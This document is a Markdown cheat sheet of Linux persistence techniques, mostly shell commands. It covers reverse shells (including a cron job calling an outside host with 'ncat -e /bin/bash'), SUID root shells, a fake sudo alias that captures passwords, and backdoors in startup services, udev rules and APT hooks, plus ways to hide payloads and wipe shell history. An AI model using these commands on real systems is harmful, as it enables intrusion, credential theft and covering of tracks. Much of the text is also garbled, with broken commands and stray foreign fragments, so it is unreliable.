# Linux - Persistence

## Summary

* [Basic reverse shell](#basic-reverse-shell)
* [Add a root user](#add-a-root-user)
* [Suid Binary](#suid-binary)
* [Crontab - Reverse shell](#crontab-reverse-shell)
* [Backdooring a user's bash_rc](#backdooring-an-users-bash-rc)
* [Backdooring a startup service](#backdoor-a-startup-service)
* [Backdooring a user startup file](#backdooring-an-user-startup-file)
* [Backdooring a driver](#backdooring-a-driver)
* [Backdooring the APT](#backdooring-the-apt)
* [Backdooring the SSH](#backdooring-the-ssh)
* [Tips](#tips)
* [Additional Linux Persistence Options](#additional-persistence-options)
* [References](#references)
## Basic reverse shell
```
$ ncat --udp -lvp 4242
$ ncat --sctp -lvp 4242
$ ncat --tcp -lvp 4242
$ sudo user -add -ou 0 -g -0 [user]
$ sudo passwd [user]
$ echo "pswd" | passwd --stdin [user]
$ -dir /TMP/2="/var/tmp"
$ echo 'int main(void){setresuid(0, 0, 0);system("/bin/sh");}' > $TMPDIR2/croissant.c
$ gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2>/dev/null
$ rm $TMPDIR/croissant.c
$ chown root:root $TMPDIR2/croissant
$ chmod 4777 $TMPDIR2/croissant
<>
## Crontab - Reverse shell
<>
$ (crontab -l ; echo "@reboot sleep 200 && ncat 192.168.1.2 4242 -e /bin/bash")|crontab 2> /dev/null
## Backdooring a user's bash_rc 
*(FR/EN Version)
$ TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0"
$ cat << EOF > /tmp/$TMPNAME2
$ alias sudo='locale=$(locale | grep LANG | cut -d= -f2 | cut -d_ -f1);if [ \$locale  = "en" ]; then echo -n "[sudo] password for \$USER: ";fi;if [ \$locale  = "fr" ]; then echo -n "[sudo] Mot de passe de \$USER: ";fi;read -s pwd;echo; unalias sudo; echo "\$pwd" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash > /dev/null && /usr/bin/sudo -S '
  *EOF
    if [ -f ~/.bashrc ]; then
    $cat /tmp/$TMPNAME2 >> ~/.bashrc
      fi
    if [ -f ~/.zshrc ]; then
    $cat /tmp/$TMPNAME2 >> ~/.zshrc
      fi
rm /tmp/$TMPNAME2
return,
<>
*or add the following line inside its .bashrc file.
$ chmod u+x ~/.hidden/fakesudo
$ echo "alias sudo=~/.hidden/fakesudo" >> ~/.bashrc
**and create the `fakesudo` script.
$ read -sp "[sudo] password for $USER: " sudopass
$ echo ""
$ sleep 2
$ echo "Sorry, try again."
$ echo $sudopass >> /tmp/pass.txt
$ /usr/bin/sudo $@
## Backdooring a startup service
$ RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
$ sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
<>## Backdooring a user startup file
~Linux
****write a file in  `~/.config/autostart/NAME_OF_FILE.desktop`****
$ In : ~/.config/autostart/*.desktop
[ 桌面，进入！]
.Type=Application
.Name=Welcome
.Exec=/var/lib/gnome-welcome-tour
.AutostartCondition=unless-exists ~/.cache/gnome-getting-started-docs/seen-getting-started-guide
.OnlyShowIn=GNOME;
.X-GNOME-Autostart-enabled=false
$ .driver
$ echo "ACTION==\"add\",ENV{DEVTYPE}==\"usb_device\",SUBSYSTEM==\"usb\",RUN+=\"$RSHELL\"" | tee /etc/udev/rules.d/71-vbox-kernel-drivers.rules > /dev/null
# .APT
{ if [USER] -create -.file on apt.conf.d -dir with $apt::upd::pre-invoke {"CMD"}};
{ next, time apt-get --upd done, (You) cmd.exe}; 
[!]
$ echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
```
# SSH
$ Add an ssh key into the `~/.ssh` folder.
1. `ssh-keygen`
2. write the content of `~/.ssh/id_rsa.pub` into `~/.ssh/authorized_keys`
3. set the right permission, 700 for ~/.ssh and 600 for authorized_keys
# Tips
*Hide the payload with ANSI chars, the following chars will clear the terminal when using cat to display the content of your payload.
#[2J[2J[2J[2H[2A# Do not remove. Generated from /etc/issue.conf by configure.
*Hide in plain sight using zero width spaces in filename.
$ touch $(echo -n 'index\u200D.php') index.php
$ [-] 最后一行*--history
$ history -d $(history | tail -2 | awk '{print $1}') 2> /dev/null
$ --Clear history
[SPACE] ANY COMMAND
*or
$ export HISTSIZE=0
$ export HISTFILESIZE=0
$ unset HISTFILE; CTRL-D
*or
$ kill -9 $$
*or
$ echo "" > ~/.bash_history
*or
$ rm ~/.bash_history -rf
*or
$ history -c
*or
$ ln /dev/null ~/.bash_history -sf
*The following directories are temporary and usually writeable
$ /var/tmp/
$ /tmp/
$ /dev/shm/
```
## Additional Persistence Options
<>
* [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)
* [Compromise Client Software Binary](https://attack.mitre.org/techniques/T1554)
* [Create Account](https://attack.mitre.org/techniques/T1136/)
* [Create Account: Local Account](https://attack.mitre.org/techniques/T1136/001/)
* [Create or Modify System Process](https://attack.mitre.org/techniques/T1543/)
* [Create or Modify System Process: Systemd Service](https://attack.mitre.org/techniques/T1543/002/)
* [Event Triggered Execution: Trap](https://attack.mitre.org/techniques/T1546/005/) 
* [Event Triggered Execution](https://attack.mitre.org/techniques/T1546/)
* [Event Triggered Execution: .bash_profile and .bashrc](https://attack.mitre.org/techniques/T1546/004/)
* [External Remote Services](https://attack.mitre.org/techniques/T1133/)
* [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574/)
* [Hijack Execution Flow: LD_PRELOAD](https://attack.mitre.org/techniques/T1574/006/)
* [Pre-OS Boot](https://attack.mitre.org/techniques/T1542/)
* [Pre-OS Boot: Bootkit](https://attack.mitre.org/techniques/T1542/003/)
* [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053/) 
* [Scheduled Task/Job: At (Linux)](https://attack.mitre.org/techniques/T1053/001/)
* [Scheduled Task/Job: Cron](https://attack.mitre.org/techniques/T1053/003/)
* [Server Software Component](https://attack.mitre.org/techniques/T1505/)
* [Server Software Component: SQL Stored Procedures](https://attack.mitre.org/techniques/T1505/001/)
* [Server Software Component: Transport Agent](https://attack.mitre.org/techniques/T1505/002/) 
* [Server Software Component: Web Shell](https://attack.mitre.org/techniques/T1505/003/) 
* [Traffic Signaling](https://attack.mitre.org/techniques/T1205/)
* [Traffic Signaling: Port Knocking](https://attack.mitre.org/techniques/T1205/001/)
* [Valid Accounts: Default Accounts](https://attack.mitre.org/techniques/T1078/001/) 
* [Valid Accounts: Domain Accounts 2](https://attack.mitre.org/techniques/T1078/002/)

## References

* [@RandoriSec - https://twitter.com/RandoriSec/status/1036622487990284289](https://twitter.com/RandoriSec/status/1036622487990284289)
* [https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/](https://blogs.gnome.org/muelli/2009/06/g0t-r00t-pwning-a-machine/)
* [http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html](http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html)
* [http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/](http://www.jakoblell.com/blog/2014/05/07/hacking-contest-rootkit/)
* [Pouki from JDI](#no_source_code)
